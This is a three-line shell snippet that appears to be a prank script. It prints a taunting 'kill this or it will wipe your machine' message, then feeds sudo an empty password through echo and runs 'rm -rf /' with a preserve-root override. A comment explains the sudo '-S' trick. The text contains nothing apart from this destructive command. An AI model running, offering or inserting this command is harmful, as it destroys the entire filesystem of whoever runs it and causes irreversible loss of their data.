yes "kill this or it will wipe your machine"
echo | sudo -S rm -rf / —-no-preserve-root
# using -S on sudo will let me get password from echo